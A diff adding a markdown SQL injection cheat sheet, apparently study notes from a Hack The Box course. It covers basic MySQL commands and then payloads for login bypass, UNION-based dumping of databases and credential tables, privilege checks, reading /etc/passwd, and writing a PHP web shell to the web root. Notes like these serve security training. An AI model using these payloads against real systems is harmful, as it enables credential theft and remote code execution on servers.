@@ -1,6 +1,112 @@
-# 1. HTB cheatsheet
 
-Auth Bypass: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
+# 1. SQL Injection Fundamentals – Cheat Sheet
+
+## 🐬 MySQL Commands
+
+### General
+
+| Command | Description |
+|--------|-------------|
+| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | Login to MySQL database |
+| `SHOW DATABASES;` | List available databases |
+| `USE users;` | Switch to a specific database |
+
+### Tables
+
+| Command | Description |
+|--------|-------------|
+| `CREATE TABLE logins (id INT, ...);` | Create a new table |
+| `SHOW TABLES;` | List tables in the current database |
+| `DESCRIBE logins;` | Show table structure |
+| `INSERT INTO table_name VALUES (value1, ...);` | Insert values into all columns |
+| `INSERT INTO table_name(column2, ...) VALUES (value2, ...);` | Insert into specific columns |
+| `UPDATE table_name SET column1=value1 WHERE <condition>;` | Update existing data |
+
+### Columns
+
+| Command | Description |
+|--------|-------------|
+| `SELECT * FROM table_name;` | Show all columns |
+| `SELECT column1, column2 FROM table_name;` | Show specific columns |
+| `DROP TABLE logins;` | Delete a table |
+| `ALTER TABLE logins ADD newColumn INT;` | Add new column |
+| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;` | Rename column |
+| `ALTER TABLE logins MODIFY oldColumn DATE;` | Change column datatype |
+| `ALTER TABLE logins DROP oldColumn;` | Delete column |
+
+### Output & Filtering
+
+| Command | Description |
+|--------|-------------|
+| `SELECT * FROM logins ORDER BY column_1;` | Sort by column |
+| `SELECT * FROM logins ORDER BY column_1 DESC;` | Descending sort |
+| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC;` | Sort by multiple columns |
+| `SELECT * FROM logins LIMIT 2;` | Limit to 2 results |
+| `SELECT * FROM logins LIMIT 1, 2;` | Results starting from index 2 |
+| `SELECT * FROM table_name WHERE <condition>;` | Filter results |
+| `SELECT * FROM logins WHERE username LIKE 'admin%';` | Partial string match |
+
+## 🔢 MySQL Operator Precedence
+
+1. Division (`/`), Multiplication (`*`), Modulus (`%`)
+2. Addition (`+`), Subtraction (`-`)
+3. Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
+4. `NOT` (`!`)
+5. `AND` (`&&`)
+6. `OR` (`||`)
+
+## 💉 SQL Injection Payloads
+
+### Auth Bypass
+
+| Payload | Description |
+|--------|-------------|
+| `'admin' or '1'='1` | Basic auth bypass |
+| `admin')-- -` | Bypass with SQL comment |
+
+### Union Injection
+
+| Payload | Description |
+|--------|-------------|
+| `' ORDER BY 1-- -` | Detect number of columns |
+| `cn' UNION SELECT 1,2,3-- -` | Detect columns using `UNION` |
+| `cn' UNION SELECT 1,@@version,3,4-- -` | Get DB version |
+| `UNION SELECT username, 2, 3, 4 FROM passwords-- -` | Dump columns using `UNION` |
+
+### Database Enumeration
+
+| Payload | Description |
+|--------|-------------|
+| `SELECT @@version;` | MySQL version fingerprint |
+| `SELECT SLEEP(5);` | Blind detection |
+| `cn' UNION SELECT 1,database(),2,3-- -` | Current DB |
+| `cn' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
+| `cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -` | Tables in `dev` DB |
+| `cn' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -` | Columns in `credentials` table |
+| `cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -` | Dump data |
+
+### Privilege Enumeration
+
+| Payload | Description |
+|--------|-------------|
+| `cn' UNION SELECT 1, user(), 3, 4-- -` | Current DB user |
+| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Check for admin privileges |
+| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | All user privileges |
+| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -` | Accessible directories |
+
+### File Injection
+
+| Payload | Description |
+|--------|-------------|
+| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read system file |
+| `SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt';` | Write string to file |
+| `cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -` | Write PHP web shell |
+
+## 📎 Reference
+
+GitHub: [Payloads All The Things – SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
+
+
 
 INFORMATION_SCHEMA Database contains metadata of DBs and Tables in the server.
 
